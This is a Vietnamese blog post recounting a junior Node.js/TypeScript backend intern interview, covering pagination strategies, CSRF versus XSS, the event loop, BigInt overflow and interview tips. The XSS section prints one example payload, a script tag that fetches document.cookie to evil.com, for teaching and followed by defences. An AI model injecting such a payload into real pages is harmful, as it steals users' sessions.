---
title: "Kể Chuyện Phỏng Vấn Junior Intern Backend Node.js TypeScript - Họ Hỏi Gì, Mình Trả Lời Ra Sao?"
author: KhaiziNam
pubDatetime: 2026-03-09T09:05:00.000Z
slug: ke-chuyen-phong-van-junior-intern-backend-nodejs-typescript-ho-hoi-gi-minh-tra-loi-ra-sao
lang: vi
translationKey: post-197
featured: true
draft: false
tags:
  - "SeriesPhongVan"
description: "Hôm nay mình muốn kể lại một buổi phỏng vấn mà mình không bao giờ quên. Không phải vì mình làm xuất sắc, mà vì mình đã đứng hình ít nhất 3 lần. Nếu bạn đang chuẩn bị cho vị trí Junior Intern Backend Node.js TypeScript, bài này sẽ tiết kiệm cho bạn kha khá thời gian \"tự nhục\". Mình sẽ kể lại từng câu hỏi, phân tích đáp án đúng, và chia sẻ những góc nhìn mà ít blog nào nhắc tới."
---

### **Kể Chuyện Phỏng Vấn Junior Intern Backend Node.js TypeScript - Họ Hỏi Gì, Mình Trả Lời Ra Sao?**

Chia sẻ thật 100% buổi phỏng vấn Junior Intern Backend Node.js TypeScript: từ câu hỏi pagination không dùng query URL, CSRF vs XSS, Event Loop đến bẫy overflow số lớn. Đọc để không bị "đứng hình" như mình!

Hôm nay mình muốn kể lại một buổi phỏng vấn mà mình không bao giờ quên. Không phải vì mình làm xuất sắc, mà vì mình đã đứng hình ít nhất 3 lần. Nếu bạn đang chuẩn bị cho vị trí **Junior Intern Backend Node.js TypeScript**, bài này sẽ tiết kiệm cho bạn kha khá thời gian "tự nhục". Mình sẽ kể lại từng câu hỏi, phân tích đáp án đúng, và chia sẻ những góc nhìn mà ít blog nào nhắc tới.

### Mục Lục

1\. [Màn giới thiệu bản thân - cái bẫy đầu tiên](#phan-1)

2\. [Pagination không dùng query URL - câu hỏi gài bẫy](#phan-2)

3\. [CSRF vs XSS - hai thứ hay bị nhầm nhất](#phan-3)

4\. [Event Loop Node.js - trái tim của runtime](#phan-4)

5\. [Hàm O(1) tính tổng 1→N và bẫy số lớn](#phan-5)

6\. [Những câu hỏi bonus họ hỏi thêm](#phan-6)

7\. [Sai lầm hay gặp và cách tránh](#phan-7)

8\. [Hỏi đáp nhanh (FAQ)](#phan-8)

9\. [Tổng kết và bước tiếp theo](#phan-9)

* * *

#### 1\. Màn Giới Thiệu Bản Thân - Cái Bẫy Đầu Tiên

Mình tưởng phần này đơn giản nhất. Hóa ra không phải.

Interviewer hỏi: **"Em tự giới thiệu đi."** Và mình đọc lại CV từ đầu đến cuối. Họ ngồi gật đầu lịch sự nhưng mình thấy rõ ánh mắt họ đang nghĩ: **"Mình vừa đọc cái này xong rồi."**

Điều họ thực sự muốn nghe không phải bạn học trường nào, GPA bao nhiêu. Họ muốn biết **bạn tư duy như thế nào**, bạn giải quyết vấn đề ra sao, và quan trọng nhất - bạn có phù hợp với team không.

##### Công thức intro hiệu quả cho vị trí intern backend

1.  **Hook:** Bắt đầu bằng 1 dự án cụ thể hoặc khoảnh khắc bạn "aha" với backend - không phải tên trường.
2.  **Stack:** Nêu rõ Node.js, TypeScript và cơ sở dữ liệu bạn đã thực sự dùng (PostgreSQL, MongoDB...).
3.  **Mindset:** Bạn đang học gì, đang giải quyết vấn đề gì trong side project hiện tại.
4.  **Mục tiêu:** Tại sao muốn làm ở công ty này cụ thể - đừng nói "để tích lũy kinh nghiệm" chung chung.

Chuẩn bị một câu chuyện dài 90 giây, không phải bản tóm tắt CV. Kể về lúc bạn debug một bug khó trong side project sẽ ấn tượng hơn GPA 3.8 rất nhiều.

* * *

#### 2\. Pagination Không Dùng Query URL - Câu Hỏi Gài Bẫy

Interviewer show đoạn code sau rồi hỏi: **"Em thấy code này làm gì? Ngoài cách này ra còn cách nào khác để implement pagination không?"**

// Controller nhận page, limit từ query string
export const getUsers = async (req: Request, res: Response) => {
  const page  = parseInt(req.query.page  as string) || 1;
  const limit = parseInt(req.query.limit as string) || 10;
  const skip  = (page - 1) \* limit;

  const users = await User.find().skip(skip).limit(limit);
  res.json(users);
};

Đây là **Offset Pagination** - cách phổ biến nhất nhưng không phải cách duy nhất. Mình biết điều này, nhưng lúc đó não bị đơ vì không nhớ tên chính xác.

##### Phương pháp 1: Cursor-Based Pagination (Keyset Pagination)

Thay vì dùng **page=2&limit=10**, ta dùng **cursor** - thường là ID hoặc timestamp của item cuối cùng đã thấy. Đây là cách Twitter, Facebook, Instagram đều dùng cho infinite scroll.

export const getUsersCursor = async (req: Request, res: Response) => {
  const cursor = req.query.cursor as string; // ID của item cuối
  const limit  = 10;

  const query = cursor ? { \_id: { $gt: cursor } } : {};

  const users = await User.find(query).limit(limit + 1);
  const hasNext = users.length > limit;
  if (hasNext) users.pop();

  res.json({
    data: users,
    nextCursor: hasNext ? users\[users.length - 1\].\_id : null
  });
};

**So sánh Offset vs Cursor:**

*   **Offset Pagination:** Trang 2 thay đổi khi có dữ liệu mới chèn vào trang 1. Chậm với bảng lớn vì DB phải scan toàn bộ offset. Không phù hợp real-time feed.
*   **Cursor Pagination:** Không bị "nhảy" dữ liệu khi có item mới. Hiệu suất ổn định dù bảng có hàng triệu record. Dùng index hiệu quả hơn nhiều.

##### Phương pháp 2: Truyền qua Request Body (POST Pagination)

Dùng cho các API phức tạp cần filter nhiều điều kiện. Thay vì nhét hàng chục query param, ta POST một JSON object:

// POST /api/users/search
export const searchUsers = async (req: Request, res: Response) => {
  const { page, limit, filters } = req.body;
  // filters: { role: 'admin', status: 'active', createdAfter: '...' }
};

##### Phương pháp 3: GraphQL Pagination (Relay Spec)

Nếu team dùng GraphQL, **Relay Cursor Spec** là chuẩn de facto với **edges**, **nodes**, **pageInfo**. Đây là điểm cộng lớn nếu bạn nhắc đến. Interviewer thực ra muốn test xem bạn có hiểu **trade-off** không - trả lời "còn nhiều cách như cursor pagination, body payload..." và so sánh luôn thì điểm sẽ cao hơn hẳn.

* * *

#### 3\. CSRF vs XSS - Hai Thứ Hay Bị Nhầm Nhất

##### XSS - Kẻ tấn công tiêm code vào trình duyệt

**Cross-Site Scripting (XSS)** xảy ra khi attacker chèn được **JavaScript độc hại** vào trang web của bạn, và script đó chạy trong trình duyệt của nạn nhân.

Ví dụ: bạn có form comment, user nhập đoạn script sau và server không sanitize rồi render ra HTML - script chạy trong trình duyệt của **tất cả người dùng khác** vào trang đó, cookie bị đánh cắp, session bị chiếm.

<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

**Ba dạng XSS phổ biến:**

*   **Stored XSS:** Payload lưu trong DB, chạy mỗi khi trang được load.
*   **Reflected XSS:** Payload nằm trong URL, victim phải click link độc.
*   **DOM-based XSS:** Khai thác JS phía client thao tác DOM không an toàn.

**Phòng chống XSS:** Escape/sanitize output (dùng thư viện như DOMPurify), Content Security Policy (CSP), HttpOnly cookies để script không đọc được cookie.

##### CSRF - Kẻ tấn công lợi dụng session hợp lệ

**Cross-Site Request Forgery (CSRF)** khác hoàn toàn. Attacker không cần đánh cắp cookie - họ **lợi dụng** cookie đó để gửi request giả danh nạn nhân.

Kịch bản: Bạn đang đăng nhập ngân hàng online, mở tab khác vào trang độc hại có embedded thẻ img trỏ đến endpoint chuyển tiền. Trình duyệt **tự động gửi cookie ngân hàng** kèm request đó. Nếu ngân hàng không có CSRF protection, lệnh chuyển tiền được thực thi.

**Phòng chống CSRF:** CSRF Token (server tạo token ngẫu nhiên, client gửi kèm mỗi request), SameSite Cookie attribute (**SameSite=Strict** hoặc **Lax**), kiểm tra Origin / Referer header.

**Điểm mấu chốt để phân biệt:** XSS là attacker chạy code **trong** trình duyệt nạn nhân để đánh cắp dữ liệu. CSRF là attacker lừa trình duyệt nạn nhân gửi request **thật** mà nạn nhân không hay biết. Hai vector tấn công hoàn toàn khác nhau, cách phòng thủ cũng khác nhau.

Câu hay bị hỏi thêm: **"HttpOnly cookie có chống được XSS không?"** - Câu trả lời: có **một phần**. HttpOnly ngăn JavaScript đọc cookie, nhưng không ngăn được Stored XSS thực thi các action khác như thay đổi UI, keylog, hay exfiltrate dữ liệu khác trên trang.

* * *

#### 4\. Event Loop Node.js - Trái Tim Của Runtime

![Event Loop Node.js - Trái Tim Của Runtime](/storage/blogs/2b46af9a-6e8f-4e5f-a88c-4aa0c25e4e95.webp)

Event Loop Node.js - Trái Tim Của Runtime

Đây là câu hỏi kinh điển. Sai lầm của mình là giải thích theo kiểu học vẹt - **"Event Loop giúp Node.js xử lý async..."** - mà không vẽ được bức tranh tổng thể.

Node.js chạy **single-threaded**, nhưng không đồng nghĩa với chậm hay blocking. Bí quyết nằm ở Event Loop phối hợp với **libuv** để delegate I/O ra ngoài thread chính.

##### 6 phases của Event Loop

1.  **timers:** Thực thi callback từ setTimeout() và setInterval() đã hết hạn.
2.  **pending callbacks:** I/O callback bị defer từ vòng trước (ví dụ: TCP error).
3.  **idle, prepare:** Dùng nội bộ bởi libuv, ít khi tương tác trực tiếp.
4.  **poll:** Lấy I/O event mới, chạy I/O callback. Đây là phase quan trọng nhất - nếu poll queue trống và không có timer nào sắp hết hạn, Event Loop **block tại đây** chờ I/O.
5.  **check:** Thực thi callback từ setImmediate().
6.  **close callbacks:** Cleanup như socket.on('close').

##### Microtask Queue - "VIP lane" của Event Loop

Trước khi chuyển sang phase tiếp theo, Node.js **drain hết** microtask queue. Thứ tự ưu tiên:

*   **process.nextTick()** - ưu tiên cao nhất, chạy trước cả Promise callback.
*   **Promise callbacks** (.then, .catch, async/await resolution).

setTimeout(()    => console.log('setTimeout'),   0);
setImmediate(()  => console.log('setImmediate'));
Promise.resolve().then(() => console.log('Promise'));
process.nextTick(() => console.log('nextTick'));

// Output thực tế:
// nextTick      ← microtask (nextTick queue)
// Promise       ← microtask (promise queue)
// setTimeout    ← macrotask (timers phase)
// setImmediate  ← macrotask (check phase)

Điểm cộng trong phỏng vấn: đề cập đến **Worker Threads** và **Cluster module** khi giải thích cách scale CPU-bound tasks - vì Event Loop không giúp được gì với heavy computation, đó là lúc cần thoát khỏi single thread.

* * *

#### 5\. Hàm O(1) Tính Tổng 1→N và Bẫy Số Lớn

Interviewer show đoạn code rồi hỏi: **"Hàm này sẽ ra sao nếu chạy với số rất lớn, ví dụ n = 10^15?"**

function sumTo(n: number): number {
  return (n \* (n + 1)) / 2;
}

Mình trả lời: **"Vẫn O(1) thôi anh, nhanh lắm."** Interviewer gật đầu, hỏi tiếp: **"Kết quả có đúng không?"** Và mình đứng hình.

##### Vấn đề: Number.MAX\_SAFE\_INTEGER

JavaScript dùng **IEEE 754 double-precision floating point** cho kiểu number. Số nguyên chỉ được biểu diễn chính xác đến **Number.MAX\_SAFE\_INTEGER = 9\_007\_199\_254\_740\_991** (xấp xỉ 9 × 10^15).

Khi n = 10^9, kết quả n × (n+1) / 2 ≈ 5 × 10^17 - đã vượt MAX\_SAFE\_INTEGER. Phép tính vẫn chạy, nhưng **kết quả sai** do mất precision. Hàm trả về O(1) thật, nhưng O(1) của một kết quả sai thì không có giá trị gì.

##### Giải pháp: dùng BigInt

function sumToBig(n: bigint): bigint {
  return (n \* (n + 1n)) / 2n;
}

console.log(sumToBig(10n \*\* 15n)); // Chính xác 100%

**BigInt** xử lý số nguyên tùy ý lớn, nhưng có trade-off: chậm hơn number thông thường và không tương thích trực tiếp với number - phải convert tường minh. Với bài toán tài chính cần precision cao, nên cân nhắc thêm thư viện như [decimal.js hoặc bignumber.js](#).

Câu trả lời lý tưởng phải đề cập: **Number.MAX\_SAFE\_INTEGER**, giải thích IEEE 754, và đề xuất BigInt hoặc thư viện phù hợp. Ba điểm đó mới đủ bộ.

* * *

#### 6\. Những Câu Hỏi Bonus Họ Hỏi Thêm

Sau 5 câu trên, interviewer có vẻ muốn explore thêm. Đây là những gì họ hỏi và góc nhìn mình học được.

##### Promise vs async/await - khác nhau thật sự là gì?

Câu trả lời đúng: **không khác nhau về bản chất** - async/await là syntactic sugar trên Promise. Điểm khác biệt thực tế nằm ở error handling (try/catch vs .catch()), readability với nested async logic, và một vài edge case như chạy parallel bằng Promise.all thay vì await tuần tự làm chậm không cần thiết.

##### Khi nào dùng TypeScript Generic?

Họ show đoạn code có **any** khắp nơi rồi hỏi cách cải thiện. Đây là cơ hội chứng minh bạn hiểu type safety thực sự. Generic không phải để "cho có TypeScript" - mà để viết hàm/class hoạt động đúng với nhiều kiểu dữ liệu mà **không mất type information**. Xem thêm [hướng dẫn TypeScript Generic cho backend Node.js](#) nếu còn mơ hồ phần này.

##### Middleware trong Express hoạt động thế nào?

Họ muốn nghe về **middleware chain**, cách next() truyền control, error middleware với 4 tham số (err, req, res, next), và thứ tự đăng ký middleware ảnh hưởng đến behavior. Hiểu [request lifecycle trong Express](#) thì câu này dễ như ăn bánh.

##### Database indexing - khi nào nên và không nên?

Index tăng tốc SELECT nhưng làm chậm INSERT/UPDATE/DELETE vì DB phải cập nhật index. Không phải field nào cũng cần index - chỉ index những field thường xuyên xuất hiện trong WHERE, JOIN, ORDER BY. Nhắc đến **composite index và selectivity** là điểm cộng lớn.

* * *

#### 7\. Những Sai Lầm Hay Gặp Và Cách Tránh

##### Sai lầm 1: Học vẹt không hiểu bản chất

Trả lời xong "Event Loop có 6 phase" nhưng không giải thích được tại sao nextTick chạy trước Promise. **Cách sửa:** Luôn chuẩn bị ví dụ code chạy được để chứng minh bạn hiểu thực sự, không phải copy-paste từ docs.

##### Sai lầm 2: Không hỏi lại khi chưa hiểu câu hỏi

Mình đã im lặng 30 giây chỉ vì không dám hỏi lại "anh ý muốn hỏi về HTTP method hay REST convention?". **Cách sửa:** Clarify ngay. Interviewer đánh giá cao người biết hỏi đúng câu hỏi - đó là dấu hiệu của kỹ sư tư duy tốt.

##### Sai lầm 3: Bỏ qua security mindset

Khi nói về API, không đề cập authentication, rate limiting, input validation. **Cách sửa:** Với mọi câu hỏi về API/backend, luôn kèm một câu về security concern liên quan - dù interviewer không hỏi.

##### Sai lầm 4: Giải thích bằng lý thuyết thay vì ví dụ

"CSRF là tấn công cross-site request forgery..." nghe rất textbook. **Cách sửa:** Kể một kịch bản cụ thể như ví dụ ngân hàng ở trên - interviewer nhớ lâu hơn và đánh giá bạn hiểu sâu hơn nhiều.

##### Sai lầm 5: Không có câu hỏi ngược lại cho interviewer

Cuối buổi họ hỏi "Em có câu hỏi gì không?" và mình nói "Không anh ơi." Đây là miss cơ hội nghiêm trọng. **Cách sửa:** Chuẩn bị 3 câu hỏi - về tech stack team đang dùng, về onboarding process, về mentorship culture.

##### Sai lầm 6: Over-engineer câu trả lời

Câu hỏi đơn giản về pagination, mình bắt đầu kể về GraphQL Federation. **Cách sửa:** Trả lời đúng scope câu hỏi trước, sau đó hỏi "Anh muốn em đi sâu hơn vào phần nào không?"

##### Sai lầm 7: Không giải thích được technical decision trong CV

Họ hỏi "Tại sao em dùng MongoDB thay vì PostgreSQL trong project này?" và mình không có lý do tốt hơn "vì tutorial dùng MongoDB". **Cách sửa:** Với mỗi tech choice trong CV, chuẩn bị trade-off analysis 2-3 câu trước khi đi phỏng vấn.

* * *

#### Hỏi Đáp Nhanh (FAQ)

##### Hỏi: Junior Intern Backend Node.js cần biết TypeScript đến mức nào?

**Đáp:** Không cần thuộc lòng advanced types như infer hay conditional types. Nhưng phải thành thạo: interface vs type, generics cơ bản, utility types (Partial, Pick, Omit), và quan trọng là hiểu tại sao tránh any. Mức độ này đủ để không bị hỏi đến góc khó trong phỏng vấn intern.

##### Hỏi: Có cần biết Docker để phỏng vấn intern backend không?

**Đáp:** Không bắt buộc, nhưng biết cơ bản Dockerfile và docker-compose là điểm cộng lớn. Phần lớn team hiện tại deploy bằng container, intern mà tự setup được local env bằng Docker sẽ tiết kiệm rất nhiều thời gian onboarding cho cả team.

##### Hỏi: Phỏng vấn intern có live coding không?

**Đáp:** Phụ thuộc công ty. Startup thường có bài test take-home 2-4 giờ hoặc live coding 30-45 phút. Công ty lớn hơn có thể có OA trên HackerRank. Trong mọi trường hợp, hãy luyện viết code rõ ràng với comment giải thích thinking process - không chỉ viết cho đúng mà viết cho người đọc hiểu.

##### Hỏi: Nên học REST API hay GraphQL trước?

**Đáp:** REST trước, không bàn cãi. Gần như 100% intern sẽ làm việc với REST API ngay từ ngày đầu. GraphQL là nice-to-have, và khi bạn hiểu REST đủ sâu thì học GraphQL rất nhanh vì nó sinh ra để giải quyết đúng các vấn đề của REST.

##### Hỏi: Không có side project thì có được phỏng vấn intern không?

**Đáp:** Không bắt buộc về mặt form, nhưng rất quan trọng về mặt thực tế. Side project là bằng chứng duy nhất bạn có khi chưa có kinh nghiệm thực tế. Nếu chưa có, hãy build một CRUD API với Node.js + TypeScript + PostgreSQL trong 2-3 tuần - đủ để nói chuyện về những vấn đề thực tế bạn đã gặp và cách bạn giải quyết.

* * *

#### Tổng Kết Và Bước Tiếp Theo

Nhìn lại buổi phỏng vấn đó, mình không fail vì thiếu kiến thức - mình fail vì **biết nhưng không diễn đạt được**. Đó là bài học đắt giá nhất.

Những gì thực sự quan trọng với một junior intern backend:

*   Hiểu **bản chất** của công cụ, không chỉ cú pháp - biết tại sao chứ không chỉ biết như thế nào.
*   Có **mental model rõ ràng** về async, I/O, và request lifecycle trong Node.js.
*   Luôn nghĩ đến **trade-off** thay vì "cách đúng duy nhất" - không có silver bullet trong engineering.
*   Có **security mindset từ sớm** - CSRF, XSS, SQL injection là baseline của mọi backend developer.
*   Build **side project thực tế** để có câu chuyện kể và lỗi thật để học từ đó.

Mình biết cảm giác ngồi chờ mail kết quả sau khi biết mình đã đứng hình vài lần. Nhưng dù kết quả thế nào, mỗi buổi phỏng vấn là một buổi học miễn phí từ những kỹ sư dày dạn kinh nghiệm. Đừng lãng phí nó.

Chúc bạn bước vào buổi phỏng vấn tiếp theo với sự tự tin - không phải vì bạn biết tất cả, mà vì bạn biết **cách tư duy đúng khi đối mặt với những gì mình chưa biết**.
